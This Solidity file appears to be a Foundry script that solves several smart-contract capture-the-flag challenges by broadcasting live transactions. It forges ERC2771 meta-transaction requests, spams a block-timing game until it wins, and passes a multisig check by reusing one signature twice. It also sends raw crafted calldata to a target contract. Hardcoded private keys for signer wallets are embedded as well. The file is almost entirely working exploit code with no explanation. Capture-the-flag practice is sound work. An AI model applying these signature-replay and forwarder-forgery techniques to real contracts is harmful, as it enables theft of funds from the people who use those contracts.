// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Vm} from "forge-std/Vm.sol";
import {Proxy} from "openzeppelin-contracts/contracts/proxy/Proxy.sol";

import {Challenge1Solver} from "test/Challenge1.t.sol";
import {Challenge2Solver} from "test/Challenge2.t.sol";
import {IPermitToReenter} from "test/Challenge5.t.sol";

import {ERC2771Context} from "@openzeppelin/contracts/metatx/ERC2771Context.sol";
import {ERC2771Forwarder} from "@openzeppelin/contracts/metatx/ERC2771Forwarder.sol";

contract RunScript is Script {
    address public challengeEasy1 = address(0x1237B533A88612E27aE447f7D84aa7Eb6722e39D);
    address public challengeEasy2 = address(0x786BeE5292B12AA79725cb66f0CBfb7E10A6CAc9);
    IPermitToReenter public challengeEasy5 = IPermitToReenter(0x6Dd509F963820F3950A56E3C0ABECdF8b3e92434);

    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    address player;

    function setUp() public {}

    function run() public {
        Vm.Wallet memory wallet = vm.createWallet(deployerPrivateKey);
        address deployer = wallet.addr;
        player = deployer;
        console.log("deployer: %s", deployer);
        console.log("eth balance: %e", player.balance);

        vm.startBroadcast(deployerPrivateKey);

        // solvingChallenge1();
        // solvingChallenge2();
        // solvingChallenge5();
        solveChallenge6();

        vm.stopBroadcast();
    }

    function solvingChallenge1() public {
        Challenge1Solver solver = new Challenge1Solver(challengeEasy1);
        (bytes32 digest, ERC2771Forwarder.ForwardRequestData memory requestData) = solver.buildNextDigest();
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(player, digest);
        bytes memory signature = abi.encodePacked(r, s, v);
        requestData.signature = signature;
        solver.execute(requestData);
    }

    function solvingChallenge2() public {
        // Sonic network each new transaction unique block.
        // so have to watching network for new transactions through ws. which is kinda slow.
        // so just spam 26 times for 1 win

        // for i in $(seq 1 500); do
        //   echo ">>> Iteration $i/500"
        //   forge script RunScript \
        //     --fork-url "$ETH_RPC_URL" \
        //     --broadcast \
        //     --gas-estimate-multiplier 1000
        // done

        Challenge2Solver solver = Challenge2Solver(payable(0x410355127f7Cd3DC48d876913816a1e5Df1c44d2));
        if (address(solver) == address(0)) solver = new Challenge2Solver(challengeEasy2);
        if (solver.isSolved()) {
            console.log("Already solved");
            return;
        }
        //then just spam call until we manage to solve it

        uint256 startBlock = solver.startBlock();
        if (startBlock == 0) {
            console.log("new game transaction");
        } else {
            console.log("repeat spam transaction, win count:", solver.winnings());
        }

        (bytes32 digest, ERC2771Forwarder.ForwardRequestData memory requestData) = solver.buildNextDigest();
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(player, digest);
        bytes memory signature = abi.encodePacked(r, s, v);
        requestData.signature = signature;
        solver.execute(requestData);
    }

    function solvingChallenge5() public {
        Vm.Wallet memory user1 = vm.createWallet(0x614f5e36cd55ddab0947d1723693fef5456e5bee24738ba90bd33c0c6e68e269);
        Vm.Wallet memory user2 = vm.createWallet(0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80);
        //we need to sign 3 multisig messages

        bytes32 digest1 = keccak256(abi.encode(user1.addr, player));
        bytes32 digest2 = keccak256(abi.encode(user2.addr, player));

        IPermitToReenter.Sig[] memory sigs = new IPermitToReenter.Sig[](3);

        (uint8 v1, bytes32 r1, bytes32 s1) = vm.sign(user1, digest1);
        (uint8 v2, bytes32 r2, bytes32 s2) = vm.sign(user2, digest2);
        sigs[0] = IPermitToReenter.Sig(0, digest1, v1, r1, s1);
        sigs[1] = IPermitToReenter.Sig(1, digest2, v2, r2, s2);
        sigs[2] = IPermitToReenter.Sig(1, digest2, v2, r2, s2);

        challengeEasy5.multisig(sigs);
    }

    function solveChallenge6() public {
        // 0x
        //0x18d8530e55cbd873780b8e356293a84679964e6f57000d1486874bf0a39aeba0a5715cd40000000000000000000000000000000000000000000000000000000000000d1b
        bytes memory data = hex"18d8530e55cbd873780b8e356293a84679964e6f57000d1486874bf0a39aeba0a5715cd40000000000000000000000000000000000000000000000000000000000000d1b";
        (bool s,)= address(0x8919B92F52bb8C1aF7C9AFeE2Bdd179d3272919e).call(
            data
        );
        require(s, "failed to call");
    }

    // ----------------------------------------- //
}
//0x18d8530e
//55cbd873780b8e356293a84679964e6f57000d1486874bf0a39aeba0a5715cd4
//18446744072190300000
//1746711516049
//0000000000000000000000000000000000000000000000000000000000000d1b